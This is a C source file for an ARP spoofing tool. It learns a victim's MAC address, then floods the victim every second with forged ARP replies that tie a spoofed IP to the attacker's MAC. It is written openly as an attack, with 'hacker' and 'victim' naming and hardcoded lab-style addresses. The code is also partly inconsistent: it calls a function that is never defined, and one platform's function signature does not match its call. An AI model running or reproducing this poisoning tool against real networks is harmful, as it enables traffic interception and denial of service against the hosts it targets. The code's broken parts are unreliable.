#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <ifaddrs.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>


#if defined(__LINUX__)
#include <linux/if_packet.h>
#else
#include <net/if_dl.h>

#endif

#include <packet.h>

# define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}


# define ERROR_SOCKET_CREATION          fprintf(stderr,"ERROR: Socket creation failed\n")
# define ERROR_GET_MAC                  fprintf(stderr,"ERROR: Could not get MAC address\n")
# define ERROR_PACKET_CREATION_ARP      fprintf(stderr,"ERROR: ARP packet creation failed\n")
# define ERROR_PACKET_CREATION_ETHER    fprintf(stderr,"ERROR: Ether frame creation failed\n")
# define ERROR_COULD_NOT_SEND           fprintf(stderr,"ERROR: Could not send\n")
# define ERROR_COULD_NOT_RECEIVE        fprintf(stderr,"ERROR: Could not receive\n")
# define ERROR_DISPLAY_USAGE(F)         fprintf(stderr,"USAGE: %s source_ip target_ip interface\n",F)

# define PRINT_MAC_ADDRESS(X)   fprintf(stdout, \
                                        "%02X:%02X:%02X:%02X:%02X:%02X\n", \
                                        X[0],               \
                                        X[1],               \
                                        X[2],               \
                                        X[3],               \
                                        X[4],               \
                                        X[5]);
# define PRINT_IP_ADDRESS(X)    fprintf(stdout, \
                                        "%02d.%02d.%02d.%02d\n", \
                                        X[0],               \
                                        X[1],               \
                                        X[2],               \
                                        X[3]);



#if defined(__APPLE__)
unsigned char *get_my_mac_address(const char *interface) {
    struct ifaddrs *ifap, *ifa;
    unsigned char *mac = NULL;

    if (getifaddrs(&ifap) != 0) {
        perror("getifaddrs");
        return NULL;
    }

    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_LINK) {
            struct sockaddr_dl *sdl = (struct sockaddr_dl *)ifa->ifa_addr;
            if (strncmp(ifa->ifa_name, interface, strlen(interface)) == 0) {
                mac = malloc(sdl->sdl_alen);
                if (mac != NULL) {
                    memcpy(mac, LLADDR(sdl), sdl->sdl_alen);
                    break;
                } else {
                    perror("malloc");
                }
            }
        }
    }

    freeifaddrs(ifap);
    return mac;
}

#else
unsigned char *get_my_mac_address(const int sock, const char interface[const])
{
    struct ifreq ifr;
    char buf[1024];
    int success = 0;

    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);

    unsigned char *MAC = malloc(sizeof(unsigned char) * 6);
    memcpy(MAC, ifr.ifr_hwaddr.sa_data, 6);

    return MAC;
}

#endif



char getIdxFromInterface(const char interface[const]) {
    unsigned int index = if_nametoindex(interface);
    if (index) {
        fprintf(stdout, "[+] Got index '%d' from interface '%s'\n",
                index, interface);
        return 1;
    }

    fprintf(stderr, "[-] Could not get index from '%s'\n", interface);
    return 0;
}

char broadcast_packet(const int sd,
                      struct sockaddr_ll *device,
                      const uint8_t *hacker_mac,
                      const char *spoof_ip,
                      const char *victim_ip)
{
    eth_header_t* eth_pkt;

    /* NOTE: See <net/if_ether.h> for packet opcode */
    if (!(eth_pkt = create_arp_packet(ARPOP_REQUEST, hacker_mac,
                                      spoof_ip, BROADCAST_ADDR,
                                      victim_ip))) {
        ERROR_PACKET_CREATION_ETHER;
        return 0;
    }
    fprintf(stdout, "[+] ETHER packet created\n");

    if ((sendto(sd, eth_pkt, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                (const struct sockaddr *)device, sizeof(*device))) <= 0) {
        ERROR_COULD_NOT_SEND;
        return 0;
    }
    fprintf(stdout, "[+] Packet sent to broadcast\n");

    return 1;
}

uint8_t *get_victim_mac(const int sd, const char *victim_ip)
{
    char buffer[IP_MAXPACKET];
    eth_header_t *eth_pkt;
    arp_packet_t *arp_pkt;
    uint8_t *victim_mac_address;
    char uint8_t_to_str[INET_ADDRSTRLEN] = {0};

    if (!(victim_mac_address = malloc(sizeof(uint8_t) * MACADDR_LEN)))
        return (NULL);

    fprintf(stdout, "[*] Listening for target response...\n");
    while (1)
    {
        /* NOTE: See `man recv` */
        // if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0)
        //     return (NULL);
        if (recv(sd, buffer, IP_MAXPACKET, 0) <= 0) return (NULL);

        eth_pkt = (eth_header_t *)buffer;
        if (ntohs(eth_pkt->eth_type) != ETH_P_ARP)
            continue;

        arp_pkt = (arp_packet_t *)(buffer + ETH_HDR_LEN);

        if (ntohs(arp_pkt->opcode) == ARPOP_REPLY
            && (arp_pkt->sender_ip != NULL &&
                inet_ntop(AF_INET, arp_pkt->sender_ip,
                          uint8_t_to_str, INET_ADDRSTRLEN))
            && !strcmp(uint8_t_to_str, victim_ip)) {
            memset(uint8_t_to_str, 0, INET_ADDRSTRLEN);
            break;
        }
    }

    fprintf(stdout, "[+] Got response from victim\n");
    fprintf(stdout, "[*] Sender MAC address: ");
    PRINT_MAC_ADDRESS(arp_pkt->sender_mac);
    fprintf(stdout, "[*] Sender ip address: ");
    PRINT_IP_ADDRESS(arp_pkt->sender_ip);
    fprintf(stdout, "[*] Target MAC address: ");
    PRINT_MAC_ADDRESS(arp_pkt->target_mac);
    fprintf(stdout, "[*] Target ip address: ");
    PRINT_IP_ADDRESS(arp_pkt->target_ip);

    memcpy(victim_mac_address, arp_pkt->sender_mac,
           MACADDR_LEN * sizeof(uint8_t));
    fprintf(stdout, "[*] Victim's MAC address: ");
    PRINT_MAC_ADDRESS(victim_mac_address);
    return (victim_mac_address);
}

char send_payload_to_victim(const int sd,
                            struct sockaddr_ll *device,
                            const uint8_t *hacker_mac,
                            const char *spoof_ip,
                            const uint8_t *victim_mac,
                            const char *victim_ip)
{
	eth_header_t *arp_packet_t;

    if (!(arp_packet_t = create_arp_packet(ARPOP_REPLY,
                                         hacker_mac, spoof_ip,
                                         victim_mac, victim_ip))) {
        ERROR_PACKET_CREATION_ARP;
        return 0;
    }

    while (1) {
        if ((sendto(sd, arp_packet_t, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            ERROR_COULD_NOT_SEND;
            return 0;
        }
        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip);
        sleep(1);
    }
    return 1;
}

int main(int argc, char *argv[])
{
    // if (argc != 4) {
    //     ERROR_DISPLAY_USAGE(argv[0]);
    //     exit(EXIT_FAILURE);
    // }

    char *victim_ip, *spoof_ip, *interface;
    unsigned char *hacker_mac = NULL;
    unsigned char *victim_mac = NULL;
    int sock;
    struct sockaddr_ll device;


    // spoof_ip = argv[1]; victim_ip = argv[2]; interface = argv[3];
    spoof_ip = "10.9.0.5";
    victim_ip = "10.9.0.6";
    interface = "eth0";


    

    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        ERROR_SOCKET_CREATION;
        return EXIT_FAILURE;
    }

    if (!(hacker_mac = get_my_mac_address(sock, interface))) {
        ERROR_GET_MAC;
        return EXIT_FAILURE;
    }

    printf("[*] Attacker MAC address: ");
    PRINT_MAC_ADDRESS(hacker_mac);

    memset(&device, 0, sizeof device);
    if (!get_index_from_interface(&device, interface)) {
        exit(EXIT_FAILURE);
    }

    if (!broadcast_packet(sock, &device, hacker_mac,
                          spoof_ip, victim_ip)) {
        exit(EXIT_FAILURE);
    }

    victim_mac = get_victim_mac(sock, victim_ip);
    send_payload_to_victim(sock, &device,
                           hacker_mac, spoof_ip,
                           victim_mac, victim_ip);

    if (hacker_mac != NULL) free(hacker_mac);
    close(sock);


    return 0;
}